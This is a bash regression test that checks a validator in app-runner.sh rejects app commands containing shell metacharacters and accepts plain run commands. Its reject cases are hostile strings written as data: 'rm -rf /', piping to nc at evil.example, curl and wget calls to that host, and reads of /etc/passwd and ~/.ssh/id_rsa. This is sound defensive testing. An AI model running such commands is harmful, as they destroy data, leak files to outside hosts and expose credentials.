#!/usr/bin/env bash
#===============================================================================
# Shell-injection regression test for app-runner.sh _validate_app_command
#
# Verifies that LOKI_APP_COMMAND values containing shell metacharacters are
# rejected by _validate_app_command (covers v7.5.8 hardening).
#===============================================================================

set -u

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"

# Stub log_error / log_info so the validator can be sourced without the wider
# loki logging stack.
log_error() { printf 'ERROR: %s\n' "$*" >&2; }
log_info()  { printf 'INFO: %s\n'  "$*" >&2; }
log_warn()  { printf 'WARN: %s\n'  "$*" >&2; }
log_step()  { printf 'STEP: %s\n'  "$*" >&2; }

# Source only the validator function by extracting the function body. We can't
# source the full file because it depends on TARGET_DIR + the loki harness.
# Instead, source via `set -e; source` of a filtered copy is overkill; just
# eval-extract the function.
_extract_fn() {
    local fn="$1" file="$2"
    awk -v fn="$fn" '
        $0 ~ "^"fn"\\(\\) \\{" { in_fn=1 }
        in_fn { print }
        in_fn && /^}$/ { exit }
    ' "$file"
}

eval "$(_extract_fn _validate_app_command "$REPO_ROOT/autonomy/app-runner.sh")"

PASS=0
FAIL=0

assert_reject() {
    local desc="$1" cmd="$2"
    if _validate_app_command "$cmd" >/dev/null 2>&1; then
        printf 'FAIL: %s -- expected rejection, got accept: %s\n' "$desc" "$cmd" >&2
        FAIL=$((FAIL+1))
    else
        printf 'PASS: rejected %s\n' "$desc"
        PASS=$((PASS+1))
    fi
}

assert_accept() {
    local desc="$1" cmd="$2"
    if _validate_app_command "$cmd" >/dev/null 2>&1; then
        printf 'PASS: accepted %s\n' "$desc"
        PASS=$((PASS+1))
    else
        printf 'FAIL: %s -- expected accept, got reject: %s\n' "$desc" "$cmd" >&2
        FAIL=$((FAIL+1))
    fi
}

# --- Injection vectors that MUST be rejected ----------------------------------
assert_reject "semicolon"            'npm run dev; rm -rf /'
assert_reject "pipe"                 'npm run dev | nc evil.example 9000'
assert_reject "background ampersand" 'npm run dev & curl evil.example'
assert_reject "command substitution" 'npm run dev $(curl evil.example)'
assert_reject "backtick substitution" 'npm run dev `id`'
assert_reject "logical and"          'npm run dev && wget evil.example'
assert_reject "logical or"           'npm run dev || wget evil.example'
assert_reject "redirect out"         'npm run dev >> /etc/hosts'
assert_reject "heredoc-ish"          'npm run dev << EOF'
assert_reject "lt redirect"          'cat < /etc/passwd'
assert_reject "gt redirect"          'npm run dev > /tmp/out'
assert_reject "tab character"        $'npm\trun\tdev'
assert_reject "newline character"    $'npm run dev\nid'
assert_reject "glob star"            'rm *'
assert_reject "glob question"        'ls ?.txt'
assert_reject "tilde expansion"      'cat ~/.ssh/id_rsa'
assert_reject "double quote"         'echo "hi"'
assert_reject "single quote"         "echo 'hi'"
assert_reject "backslash"            'echo \\n'
assert_reject "parens"               '(id)'
assert_reject "braces"               '{ id; }'

# --- Legitimate commands that MUST be accepted --------------------------------
assert_accept "npm run dev"               'npm run dev'
assert_accept "npm start"                 'npm start'
assert_accept "docker compose up -d"      'docker compose up -d'
assert_accept "python with flag"          'python manage.py runserver'
assert_accept "uvicorn with key=value"    'uvicorn main=app --port=8000'
assert_accept "go run dot"                'go run .'
assert_accept "cargo run"                 'cargo run'

printf '\n--- summary: %d passed, %d failed ---\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
